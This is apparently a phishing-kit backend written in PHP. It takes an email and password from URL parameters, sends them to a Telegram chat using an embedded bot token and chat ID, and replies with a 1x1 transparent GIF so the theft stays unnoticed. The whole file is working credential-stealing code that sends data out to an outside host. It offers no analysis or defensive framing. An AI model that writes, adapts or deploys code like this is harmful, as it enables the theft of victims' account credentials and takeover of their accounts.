<?php
// Get the email and password from the request
$email = isset($_GET['email']) ? $_GET['email'] : 'No email provided';
$password = isset($_GET['password']) ? $_GET['password'] : 'No password provided';

// Telegram bot configuration
$botToken = '6746147806:AAE1toWGhrWj_iAKsXDPOY-ZlVEypnkmRjk'; // Replace with your actual bot token
$chatId = '-4755958545'; // Replace with your chat ID

// Prepare message
$message = "New credentials received:\n";
$message .= "Email: " . $email . "\n";
$message .= "Password: " . $password;

// Send to Telegram
$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$parameters = [
    'chat_id' => $chatId,
    'text' => $message
];

// Use cURL to send the request
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Return an empty response
header('Content-Type: image/gif');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'); // 1x1 transparent GIF
?>
